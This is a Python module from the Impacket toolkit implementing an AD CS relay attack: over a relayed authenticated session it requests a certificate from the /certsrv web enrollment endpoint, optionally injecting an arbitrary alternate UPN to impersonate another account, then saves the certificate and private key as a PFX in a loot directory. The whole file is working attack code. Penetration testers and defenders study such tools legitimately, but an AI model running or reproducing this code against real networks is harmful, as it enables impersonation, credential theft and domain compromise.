# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD CS relay attack
#
# Authors:
#   Ex Android Dev (@ExAndroidDev)
#   Tw1sm (@Tw1sm)

import re
import base64
import os
from OpenSSL import crypto

from impacket import LOG

# cache already attacked clients
ELEVATED = []


class ADCSAttack:

    def _run(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return

        current_template = self.config.template
        if current_template is None:
            current_template = "Machine" if self.username.endswith("$") else "User"

        csr = self.generate_csr(key, self.username, self.config.altName)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        LOG.info("CSR generated!")

        certAttrib = self.generate_certattributes(current_template, self.config.altName)

        data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        LOG.info("Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        ELEVATED.append(self.username)
        response = self.client.getresponse()

        if response.status != 200:
            LOG.error("Error getting certificate! Make sure you have entered valid certificate template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            LOG.error("Error obtaining certificate!")
            return

        certificate_id = found[0]

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
        certificate = response.read().decode()

        certificate_store = self.generate_pfx(key, certificate)
        LOG.info("Writing PKCS#12 certificate to %s/%s.pfx" % (self.config.lootdir, self.username))
        try:
            if not os.path.isdir(self.config.lootdir):
                os.mkdir(self.config.lootdir)
            with open("%s/%s.pfx" % (self.config.lootdir, self.username), 'wb') as f:
                f.write(certificate_store)
            LOG.info("Certificate successfully written to file")
        except Exception as e:
            LOG.info("Unable to write certificate to file, printing B64 of certificate to console instead")
            LOG.info("Base64-encoded PKCS#12 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
            pass

        if self.config.altName:
            LOG.info("This certificate can also be used for user : {}".format(self.config.altName))

    def generate_csr(self, key, CN, altName):
        LOG.info("Generating CSR...")
        req = crypto.X509Req()
        req.get_subject().CN = CN

        if altName:
            req.add_extensions([crypto.X509Extension(b"subjectAltName", False, b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" %  altName.encode() )])


        req.set_pubkey(key)
        req.sign(key, "sha256")

        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)

    def generate_pfx(self, key, certificate):
        certificate = crypto.load_certificate(crypto.FILETYPE_PEM, certificate)
        p12 = crypto.PKCS12()
        p12.set_certificate(certificate)
        p12.set_privatekey(key)
        return p12.export()

    def generate_certattributes(self, template, altName):

        if altName:
            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
        return "CertificateTemplate:{}".format(template)
